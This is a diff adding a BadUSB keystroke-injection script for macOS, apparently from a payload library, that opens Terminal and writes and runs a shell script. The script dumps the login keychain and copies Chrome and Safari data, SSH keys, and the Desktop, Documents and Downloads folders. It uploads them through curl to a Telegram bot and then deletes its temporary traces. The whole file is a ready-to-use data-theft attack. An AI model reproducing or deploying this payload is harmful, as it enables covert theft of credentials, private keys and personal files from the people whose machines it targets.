@@ -1,0 +1,108 @@
+REM Title: macOS File Exfiltrator to Telegram
+REM Author: BadUSB Library
+REM Description: Exfiltrates sensitive files and sends to Telegram
+REM Target: macOS 10.15+
+REM Category: Data Exfiltration
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Create file exfiltration script
+STRING cat > /tmp/file_exfiltrator.sh << 'EOF'
+#!/bin/bash
+
+# Telegram configuration
+BOT_TOKEN="TELEGRAM_BOT_TOKEN"
+CHAT_ID="TELEGRAM_CHAT_ID"
+
+# Function to send file to Telegram
+send_file_telegram() {
+    local file_path="$1"
+    local caption="$2"
+    
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
+        -F chat_id="${CHAT_ID}" \
+        -F document=@"${file_path}" \
+        -F caption="${caption}"
+}
+
+# Function to send message to Telegram
+send_telegram() {
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+        -d chat_id="${CHAT_ID}" \
+        -d text="$1"
+}
+
+# Create exfiltration directory
+mkdir -p /tmp/exfiltrated_files
+
+# Exfiltrate sensitive files
+send_telegram "📁 Starting file exfiltration..."
+
+# Browser data
+if [ -d ~/Library/Application\ Support/Google/Chrome/Default ]; then
+    cp -r ~/Library/Application\ Support/Google/Chrome/Default /tmp/exfiltrated_files/chrome_data
+    tar -czf /tmp/chrome_data.tar.gz -C /tmp/exfiltrated_files chrome_data
+    send_file_telegram "/tmp/chrome_data.tar.gz" "Chrome Browser Data"
+fi
+
+# Safari data
+if [ -d ~/Library/Safari ]; then
+    cp -r ~/Library/Safari /tmp/exfiltrated_files/safari_data
+    tar -czf /tmp/safari_data.tar.gz -C /tmp/exfiltrated_files safari_data
+    send_file_telegram "/tmp/safari_data.tar.gz" "Safari Browser Data"
+fi
+
+# Keychain data
+security dump-keychain -d login.keychain > /tmp/keychain_dump.txt 2>/dev/null
+send_file_telegram "/tmp/keychain_dump.txt" "Keychain Data"
+
+# Desktop files
+if [ -d ~/Desktop ]; then
+    tar -czf /tmp/desktop_files.tar.gz -C ~ Desktop
+    send_file_telegram "/tmp/desktop_files.tar.gz" "Desktop Files"
+fi
+
+# Documents
+if [ -d ~/Documents ]; then
+    tar -czf /tmp/documents.tar.gz -C ~ Documents
+    send_file_telegram "/tmp/documents.tar.gz" "Documents"
+fi
+
+# Downloads
+if [ -d ~/Downloads ]; then
+    tar -czf /tmp/downloads.tar.gz -C ~ Downloads
+    send_file_telegram "/tmp/downloads.tar.gz" "Downloads"
+fi
+
+# SSH keys
+if [ -d ~/.ssh ]; then
+    cp -r ~/.ssh /tmp/exfiltrated_files/ssh_keys
+    tar -czf /tmp/ssh_keys.tar.gz -C /tmp/exfiltrated_files ssh_keys
+    send_file_telegram "/tmp/ssh_keys.tar.gz" "SSH Keys"
+fi
+
+# Cleanup
+rm -rf /tmp/exfiltrated_files
+rm -f /tmp/*.tar.gz /tmp/keychain_dump.txt
+
+send_telegram "✅ File exfiltration completed"
+
+EOF
+ENTER
+
+REM Make executable and run
+STRING chmod +x /tmp/file_exfiltrator.sh
+ENTER
+STRING /tmp/file_exfiltrator.sh
+ENTER
